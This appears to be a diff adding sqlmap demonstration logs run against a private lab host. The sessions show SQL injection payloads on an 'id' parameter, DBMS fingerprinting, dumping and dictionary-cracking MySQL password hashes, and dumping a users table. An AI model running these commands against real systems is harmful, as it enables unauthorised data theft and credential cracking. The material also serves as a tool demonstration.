@@ -1,0 +1,307 @@
+$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" -z "ign,flu,bat" --banner -f
+
+    sqlmap/1.0-dev-7614c81 - automatic SQL injection and database takeover tool
+    http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 10:30:49
+
+[10:30:49] [INFO] testing connection to the target url
+[10:30:50] [INFO] heuristics detected web page charset 'ascii'
+[10:30:50] [INFO] testing if the url is stable. This can take a couple of seconds
+[10:30:51] [INFO] url is stable
+[10:30:51] [INFO] testing if GET parameter 'id' is dynamic
+[10:30:51] [INFO] confirming that GET parameter 'id' is dynamic
+[10:30:51] [INFO] GET parameter 'id' is dynamic
+[10:30:51] [WARNING] reflective value(s) found and filtering out
+[10:30:51] [INFO] heuristic (basic) test shows that GET parameter 'id' might be injectable (possible DBMS: 'MySQL')
+[10:30:51] [INFO] testing for SQL injection on GET parameter 'id'
+heuristic (parsing) test showed that the back-end DBMS could be 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
+do you want to include all tests for 'MySQL' extending provided level (1) and risk (1)? [Y/n] Y
+[10:30:51] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
+[10:30:51] [INFO] GET parameter 'id' is 'AND boolean-based blind - WHERE or HAVING clause' injectable 
+[10:30:51] [INFO] testing 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause'
+[10:30:51] [INFO] GET parameter 'id' is 'MySQL >= 5.0 AND error-based - WHERE or HAVING clause' injectable 
+[10:30:51] [INFO] testing 'MySQL inline queries'
+[10:30:51] [INFO] testing 'MySQL > 5.0.11 stacked queries'
+[10:30:51] [WARNING] time-based comparison needs larger statistical model. Making a few dummy requests, please wait..                                                                                                                       
+[10:30:51] [INFO] testing 'MySQL < 5.0.12 stacked queries (heavy query)'
+[10:30:51] [INFO] testing 'MySQL > 5.0.11 AND time-based blind'
+[10:31:01] [INFO] GET parameter 'id' is 'MySQL > 5.0.11 AND time-based blind' injectable 
+[10:31:01] [INFO] testing 'MySQL UNION query (NULL) - 1 to 20 columns'
+[10:31:01] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other potential injection technique found
+[10:31:01] [INFO] ORDER BY technique seems to be usable. This should reduce the time needed to find the right number of query columns. Automatically extending the range for current UNION query injection technique test
+[10:31:01] [INFO] target url appears to have 3 columns in query
+[10:31:01] [INFO] GET parameter 'id' is 'MySQL UNION query (NULL) - 1 to 20 columns' injectable
+GET parameter 'id' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
+sqlmap identified the following injection points with a total of 25 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 2425=2425
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 6567 FROM(SELECT COUNT(*),CONCAT(0x3a6f78783a,(SELECT (CASE WHEN (6567=6567) THEN 1 ELSE 0 END)),0x3a70776a3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: id=1 UNION ALL SELECT NULL,CONCAT(0x3a6f78783a,0x76564d4d547749597144,0x3a70776a3a),NULL#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+---
+[10:31:02] [INFO] testing MySQL
+[10:31:02] [INFO] confirming MySQL
+[10:31:02] [INFO] the back-end DBMS is MySQL
+[10:31:02] [INFO] fetching banner
+[10:31:02] [INFO] actively fingerprinting MySQL
+[10:31:02] [INFO] executing MySQL comment injection fingerprint
+web application technology: PHP 5.2.6, Apache 2.2.9
+back-end DBMS: active fingerprint: MySQL >= 5.1.12 and < 5.5.0
+               comment injection fingerprint: MySQL 5.1.41
+               banner parsing fingerprint: MySQL 5.1.41
+               html error message fingerprint: MySQL
+banner:    '5.1.41-3~bpo50+1'
+[10:31:03] [INFO] fetched data logged to text files under '/home/user/sqlmap/output/192.168.21.128'
+
+[*] shutting down at 10:31:03
+
+$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" -z "ign,bat" --passwords
+
+    sqlmap/1.0-dev-7614c81 - automatic SQL injection and database takeover tool
+    http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 10:33:49
+
+[10:33:49] [INFO] resuming back-end DBMS 'mysql' 
+[10:33:49] [INFO] testing connection to the target url
+[10:33:49] [INFO] heuristics detected web page charset 'ascii'
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 1678=1678
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5737 FROM(SELECT COUNT(*),CONCAT(0x3a73717a3a,(SELECT (CASE WHEN (5737=5737) THEN 1 ELSE 0 END)),0x3a626e6e3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: id=1 UNION ALL SELECT CONCAT(0x3a73717a3a,0x41646e50704952476459,0x3a626e6e3a),NULL,NULL#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+---
+[10:33:49] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 5.2.6, Apache 2.2.9
+back-end DBMS: MySQL 5.0
+[10:33:49] [INFO] fetching database users password hashes
+[10:33:49] [INFO] writing hashes to file '/tmp/sqlmaphashes-eP3BrF.txt' for eventual further processing with other tools
+do you want to perform a dictionary-based attack against retrieved password hashes? [Y/n/q] Y
+[10:33:49] [INFO] using hash method 'mysql_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/home/user/sqlmap/txt/wordlist.zip' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 1
+[10:33:49] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] N
+[10:33:49] [INFO] starting dictionary-based cracking (mysql_passwd)
+[10:33:49] [INFO] starting 8 processes 
+[10:33:59] [INFO] cracked password 'testpass' for user 'root'                                                                                                                                                                               
+database management system users password hashes:                                                                                                                                                                                           
+[*] debian-sys-maint [1]:
+    password hash: *6B2C58EABD91C1776DA223B088B601604F898847
+[*] root [1]:
+    password hash: *00E247AC5F9AF26AE0194B41E1E769DEE1429A29
+    clear-text password: testpass
+
+[10:34:01] [INFO] fetched data logged to text files under '/home/user/sqlmap/output/192.168.21.128'
+
+[*] shutting down at 10:34:01
+
+$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" -z "ign,bat" --dbs
+
+    sqlmap/1.0-dev-7614c81 - automatic SQL injection and database takeover tool
+    http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 10:34:27
+
+[10:34:27] [INFO] resuming back-end DBMS 'mysql' 
+[10:34:27] [INFO] testing connection to the target url
+[10:34:27] [INFO] heuristics detected web page charset 'ascii'
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 1678=1678
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5737 FROM(SELECT COUNT(*),CONCAT(0x3a73717a3a,(SELECT (CASE WHEN (5737=5737) THEN 1 ELSE 0 END)),0x3a626e6e3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: id=1 UNION ALL SELECT CONCAT(0x3a73717a3a,0x41646e50704952476459,0x3a626e6e3a),NULL,NULL#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+---
+[10:34:27] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 5.2.6, Apache 2.2.9
+back-end DBMS: MySQL 5.0
+[10:34:27] [INFO] fetching database names
+available databases [4]:
+[*] information_schema
+[*] mysql
+[*] owasp10
+[*] testdb
+
+[10:34:27] [INFO] fetched data logged to text files under '/home/user/sqlmap/output/192.168.21.128'
+
+[*] shutting down at 10:34:27
+
+$ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" -z "ign,bat" --tables -D testdb
+
+    sqlmap/1.0-dev-7614c81 - automatic SQL injection and database takeover tool
+    http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 10:34:41
+
+[10:34:41] [INFO] resuming back-end DBMS 'mysql' 
+[10:34:41] [INFO] testing connection to the target url
+[10:34:41] [INFO] heuristics detected web page charset 'ascii'
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 1678=1678
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5737 FROM(SELECT COUNT(*),CONCAT(0x3a73717a3a,(SELECT (CASE WHEN (5737=5737) THEN 1 ELSE 0 END)),0x3a626e6e3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: id=1 UNION ALL SELECT CONCAT(0x3a73717a3a,0x41646e50704952476459,0x3a626e6e3a),NULL,NULL#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+---
+[10:34:41] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 5.2.6, Apache 2.2.9
+back-end DBMS: MySQL 5.0
+[10:34:41] [INFO] fetching tables for database: 'testdb'
+Database: testdb
+[4 tables]
++---------------+
+| data          |
+| international |
+| test_blob     |
+| users         |
++---------------+
+
+[10:34:41] [INFO] fetched data logged to text files under '/home/user/sqlmap/output/192.168.21.128'
+
+[*] shutting down at 10:34:41
+                                                                                                                                                                                                                                           $ python sqlmap.py -u "http://192.168.21.128/sqlmap/mysql/get_int.php?id=1" -z "ign,bat" --tables --dump -D testdb -T users
+
+    sqlmap/1.0-dev-7614c81 - automatic SQL injection and database takeover tool
+    http://sqlmap.org
+
+[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
+
+[*] starting at 10:34:58
+
+[10:34:58] [INFO] resuming back-end DBMS 'mysql' 
+[10:34:58] [INFO] testing connection to the target url
+[10:34:59] [INFO] heuristics detected web page charset 'ascii'
+sqlmap identified the following injection points with a total of 0 HTTP(s) requests:
+---
+Place: GET
+Parameter: id
+    Type: boolean-based blind
+    Title: AND boolean-based blind - WHERE or HAVING clause
+    Payload: id=1 AND 1678=1678
+
+    Type: error-based
+    Title: MySQL >= 5.0 AND error-based - WHERE or HAVING clause
+    Payload: id=1 AND (SELECT 5737 FROM(SELECT COUNT(*),CONCAT(0x3a73717a3a,(SELECT (CASE WHEN (5737=5737) THEN 1 ELSE 0 END)),0x3a626e6e3a,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)
+
+    Type: UNION query
+    Title: MySQL UNION query (NULL) - 3 columns
+    Payload: id=1 UNION ALL SELECT CONCAT(0x3a73717a3a,0x41646e50704952476459,0x3a626e6e3a),NULL,NULL#
+
+    Type: AND/OR time-based blind
+    Title: MySQL > 5.0.11 AND time-based blind
+    Payload: id=1 AND SLEEP(5)
+---
+[10:34:59] [INFO] the back-end DBMS is MySQL
+web application technology: PHP 5.2.6, Apache 2.2.9
+back-end DBMS: MySQL 5.0
+[10:34:59] [INFO] fetching tables for database: 'testdb'
+Database: testdb
+[4 tables]
++---------------+
+| data          |
+| international |
+| test_blob     |
+| users         |
++---------------+
+
+[10:34:59] [INFO] fetching columns for table 'users' in database 'testdb'
+[10:34:59] [INFO] fetching entries for table 'users' in database 'testdb'
+[10:34:59] [INFO] analyzing table dump for possible password hashes
+[10:34:59] [INFO] recognized possible password hashes in column 'surname'
+[10:34:59] [INFO] writing hashes to file '/tmp/sqlmaphashes-9ALGaw.txt' for eventual further processing with other tools
+do you want to crack them via a dictionary-based attack? [Y/n/q] Y
+[10:34:59] [INFO] using hash method 'md5_generic_passwd'
+what dictionary do you want to use?
+[1] default dictionary file '/home/user/sqlmap/txt/wordlist.zip' (press Enter)
+[2] custom dictionary file
+[3] file with list of dictionary files
+> 1
+[10:34:59] [INFO] using default dictionary
+do you want to use common password suffixes? (slow!) [y/N] N
+[10:34:59] [INFO] starting dictionary-based cracking (md5_generic_passwd)
+[10:34:59] [INFO] starting 8 processes 
+[10:35:08] [INFO] cracked password 'testpass' for hash '179ad45c6ce2cb97cf1029e212046e81'                                                                                                                                                   
+[10:35:09] [INFO] postprocessing table dump                                                                                                                                                                                                 
+Database: testdb
+Table: users
+[5 entries]
++----+--------+---------------------------------------------+
+| id | name   | surname                                     |
++----+--------+---------------------------------------------+
+| 1  | luther | blissett                                    |
+| 2  | fluffy | bunny                                       |
+| 3  | wu     | ming                                        |
+| 4  | NULL   | nameisnull                                  |
+| 5  | heeej  | 179ad45c6ce2cb97cf1029e212046e81 (testpass) |
++----+--------+---------------------------------------------+
+
+[10:35:09] [INFO] table 'testdb.users' dumped to CSV file '/home/user/sqlmap/output/192.168.21.128/dump/testdb/users.csv'
+[10:35:09] [INFO] fetched data logged to text files under '/home/user/sqlmap/output/192.168.21.128'
+
+[*] shutting down at 10:35:09
